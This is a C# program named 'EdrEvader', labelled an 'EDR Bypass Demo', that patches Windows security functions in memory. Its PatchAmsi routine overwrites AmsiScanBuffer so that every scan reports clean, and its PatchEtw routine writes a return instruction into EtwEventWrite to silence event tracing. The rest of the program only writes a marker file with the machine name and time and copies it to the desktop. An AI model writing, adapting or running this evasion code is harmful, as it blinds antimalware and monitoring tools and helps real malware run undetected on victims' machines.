using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace EdrEvader
{
    internal static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule,
            [MarshalAs(UnmanagedType.LPStr)] string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr CreateFile(string lpFileName,
            uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition,
            uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer,
            uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CopyFile(string lpExistingFileName,
            string lpNewFileName, bool bFailIfExists);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        public const uint PAGE_EXECUTE_READWRITE = 0x40;
        public const uint PAGE_READWRITE         = 0x04;
        public const uint GENERIC_WRITE          = 0x40000000;
        public const uint CREATE_ALWAYS          = 2;
        public const uint FILE_ATTRIBUTE_NORMAL  = 0x80;
        public const uint INVALID_HANDLE_VALUE   = 0xFFFFFFFF;
    }

    internal static class Program
    {
        static void Main()
        {
            Console.WriteLine("=== EDR Bypass Demo ===");

            // KATMAN 1: AMSI patch
            PatchAmsi();

            // KATMAN 2: ETW patch
            PatchEtw();

            // KATMAN 3: Dosya oluştur (plain strings)
            string rootPath = @"C:\temp";
            string fileName = "sysinfo.txt";
            string rootFile = rootPath + @"\" + fileName;
            string deskFile = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
                + @"\" + fileName;

            // Create directory if not exists
            Directory.CreateDirectory(rootPath);

            IntPtr hFile = NativeMethods.CreateFile(rootFile,
                NativeMethods.GENERIC_WRITE, 0, IntPtr.Zero,
                NativeMethods.CREATE_ALWAYS, NativeMethods.FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);

            if (hFile == (IntPtr)(-1) || hFile == IntPtr.Zero)
            {
                Console.WriteLine("[!] CreateFile failed: " +
                    new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                return;
            }

            try
            {
                string content = "[EDR Bypass] System: " + Environment.MachineName
                    + " | Time: " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                byte[] data = Encoding.UTF8.GetBytes(content);

                if (!NativeMethods.WriteFile(hFile, data, (uint)data.Length,
                        out uint written, IntPtr.Zero))
                {
                    Console.WriteLine("[!] WriteFile failed: " +
                        new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                    return;
                }

                Console.WriteLine("[+] Written " + written + " bytes to " + rootFile);
            }
            finally
            {
                NativeMethods.CloseHandle(hFile);
            }

            // Desktop'a kopyala
            if (NativeMethods.CopyFile(rootFile, deskFile, false))
            {
                Console.WriteLine("[+] Copied to desktop: " + deskFile);
            }
            else
            {
                Console.WriteLine("[!] CopyFile failed: " +
                    new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
            }
        }

        static void PatchAmsi()
        {
            try
            {
                IntPtr hMod = NativeMethods.GetModuleHandle("amsi.dll");
                if (hMod == IntPtr.Zero) { Console.WriteLine("[-] AMSI not loaded"); return; }

                IntPtr pFunc = NativeMethods.GetProcAddress(hMod, "AmsiScanBuffer");
                if (pFunc == IntPtr.Zero) { Console.WriteLine("[-] AmsiScanBuffer not found"); return; }

                // mov eax, 0x00005700 ; ret  => AMSI_RESULT_CLEAN
                byte[] patch = new byte[] { 0xB8, 0x00, 0x57, 0x00, 0x00, 0xC3 };

                NativeMethods.VirtualProtect(pFunc, (UIntPtr)patch.Length,
                    NativeMethods.PAGE_EXECUTE_READWRITE, out uint old);
                Marshal.Copy(patch, 0, pFunc, patch.Length);
                NativeMethods.VirtualProtect(pFunc, (UIntPtr)patch.Length, old, out _);

                Console.WriteLine("[+] AMSI patched -> AMSI_RESULT_CLEAN");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] AMSI patch error: " + ex.Message);
            }
        }

        static void PatchEtw()
        {
            try
            {
                IntPtr hMod = NativeMethods.GetModuleHandle("ntdll.dll");
                if (hMod == IntPtr.Zero) return;

                IntPtr pFunc = NativeMethods.GetProcAddress(hMod, "EtwEventWrite");
                if (pFunc == IntPtr.Zero) { Console.WriteLine("[-] EtwEventWrite not found"); return; }

                // ret (0xC3)
                byte[] patch = new byte[] { 0xC3 };

                NativeMethods.VirtualProtect(pFunc, (UIntPtr)patch.Length,
                    NativeMethods.PAGE_EXECUTE_READWRITE, out uint old);
                Marshal.Copy(patch, 0, pFunc, patch.Length);
                NativeMethods.VirtualProtect(pFunc, (UIntPtr)patch.Length, old, out _);

                Console.WriteLine("[+] ETW patched -> silent");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] ETW patch error: " + ex.Message);
            }
        }
    }
}
